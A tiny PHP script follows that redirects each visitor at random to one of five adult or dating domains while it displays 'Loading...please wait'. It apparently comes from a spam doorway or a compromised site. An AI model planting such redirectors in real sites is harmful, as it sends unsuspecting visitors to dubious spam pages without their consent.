<?php
$urls = array("datescheck.info",
              "wephookup.mobi",
              "horniestsingles.com",
              "primeloveonline.info",
              "gorgeousprofiles.pro");
$url = $urls[array_rand($urls)];
header("Location: http://$url");
echo "Loading...please wait";
?>

